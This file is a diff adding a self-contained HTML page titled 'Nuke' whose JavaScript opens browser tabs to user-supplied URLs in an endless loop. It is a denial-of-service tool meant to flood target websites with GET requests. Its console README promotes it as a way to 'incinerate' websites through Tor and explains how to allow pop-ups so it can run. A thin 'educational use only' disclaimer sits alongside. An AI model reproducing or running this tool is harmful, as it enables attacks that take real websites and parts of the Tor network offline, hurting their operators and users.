@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+
+<!-- MIT License
+   - 
+   - Copyright (c) 2021 gh0$t
+   - 
+   - Permission is hereby granted, free of charge, to any person obtaining a copy
+   - of this software and associated documentation files (the "Software"), to deal
+   - in the Software without restriction, including without limitation the rights
+   - to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+   - copies of the Software, and to permit persons to whom the Software is
+   - furnished to do so, subject to the following conditions:
+   - 
+   - The above copyright notice and this permission notice shall be included in all
+   - copies or substantial portions of the Software.
+   - 
+   - THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+   - IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+   - FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+   - AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+   - LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+   - OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+   - SOFTWARE. -->
+
+<html lang="en-US">
+<meta charset="UTF-8">
+<title>☢Nuke☢</title>
+
+<head>
+    <style>
+        body {
+            font-family: monospace;
+            text-align: center;
+        }
+
+        body * {
+            font-family: monospace;
+            text-align: center;
+            font-size: 2rem;
+        }
+
+        h1 {
+            font-size: 3rem;
+        }
+
+        h2 {
+            /* font-style: italic; */
+            font-size: 2.5rem;
+        }
+
+        div {
+            padding: 1rem;
+        }
+
+        div * {
+            width: 70%;
+        }
+
+        div textarea {
+            height: 10rem;
+        }
+
+        .note {
+            font-size: 1rem;
+        }
+
+        .bold {
+            font-weight: 900;
+        }
+
+        .bolder {
+            font-weight: bolder;
+            font-size: 1.5rem;
+        }
+
+        .sexyColor {
+            color: #d90166;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>"Nuke 'em!"</h1>
+    <h2>☲☢☠☢☲</h2>
+    <div class="note sexyColor">(Check console for README.)</div>
+    <div><textarea></textarea>
+    </div>
+    <div><button onclick="fire();">"Incinerate!!!"</button></div>
+    <script type="text/javascript">
+        var fire = function () {
+            var urls = document.querySelector('textarea').value.replace(/\n/ig, '').replace(/ /ig, '').split(',').filter(function (url) {
+                return !!url;
+            });
+            if (urls.length === 0) {
+                return;
+            }
+            var win = {};
+            var autoCloseFrequency = 1000; // after opening how many tabs the tool should close them to preserve memory and also give ample amount of time for most of the tabs to load
+            var counter = 0; // a counter to count all windows that have been opened and then compare it with autoCloseFrequency for cleanup
+            for (var i = 1; i > 0; i++) {
+                urls.forEach(function (url) {
+                    win[++counter] = window.open(url);
+                    if (counter % autoCloseFrequency === 0) {
+                        for (var j = 1; j <= counter; j++) {
+                            try {
+                                win[j].close();
+                                delete win[j];
+                            } catch {
+                                // too lazy to bother about already closed windows, i.e., if delete win[j] fails, which shouldn't...
+                            }
+                        }
+                    }
+                });
+            }
+        };
+
+        var readme =
+            `
+
+****************************************************************************************************
+☲☢☠ Nuke ☠☢☲
+****************************************************************************************************
+
+Now nuke & incinerate multiple websites with this bulk URL DoS Tool!
+Accepts multiple ',' separated URLs and performs an HTTP/HTTPS GET attack by opening Infinite Browser Tabs, backed up by Crash Protection, where opened windows are auto-closed for RAM relief.
+
+Just run it in your TOR browser.
+Bookmark it for ease of access.
+Pass your desired comma separated URLs, or just a single URL.
+Click the '"Incinerate!!!"' button.
+Watch the websites / website die out slowly.
+You might wish to go and get a chalice of rum / vodka / whisky / scotch / wine etc. by this time.
+
+FYI : Before running the Nuke tool, remember to Whitelist it in the Browser Settings. Menu (top right) -> Options -> Privacy & Security (left side menu) -> Block pop-up windows (scroll down) -> Exceptions -> add the url of the file.
+
+Also, after every 1000th attack it will auto-close previous 1000 tabs to preserve memory. You can vary the frequency of auto-close operation on need basis (var autoCloseFrequency).
+
+Also, remember, more URLs = less tabs allocated to each URL within the autoCloseFrequency limit.
+So, if URLs > 5, increase autoCloseFrequency, & pray that your RAM has got enough juice.
+
+NOTE:
+I wrote these tools for researching ways to Stress Test an onion site (a Darknet / Deepweb / Darkweb site).
+Please use it for research purpose only.
+
+Cons:
+(1) May result in taking down the TOR Network.
+(2) RAM Intensive.
+
+IMPORTANT: THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
+
+****************************************************************************************************
+
+`;
+
+        console.log('%c' + readme, 'color: #d90166; font-size: 2rem;');
+
+
+    </script>
+</body>
+
+</html>
